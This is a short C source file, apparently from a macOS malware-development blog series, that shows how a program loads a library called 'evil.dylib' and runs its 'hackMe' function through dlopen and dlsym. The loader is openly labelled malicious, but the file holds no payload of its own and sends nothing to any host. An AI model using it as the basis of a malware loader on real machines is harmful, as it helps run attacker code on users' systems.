/*
 * hack.c
 * load library on macOS
 * author @cocomelonc
 * https://cocomelonc.github.io/macos/2025/08/10/malware-mac-8.html
 */
#include <dlfcn.h>
#include <stdio.h>

int main() {
  // malicious dylib
  void *handle = dlopen("./evil.dylib", RTLD_LAZY);
  if (!handle) {
    fprintf(stderr, "error: %s\n", dlerror());
    return 1;
  }

  // import and execute malicious function from lib
  void (*hackMe)() = dlsym(handle, "hackMe");
  if (hackMe) {
    hackMe(); // run malicious function
  }

  dlclose(handle);  // close handle
  return 0;
}
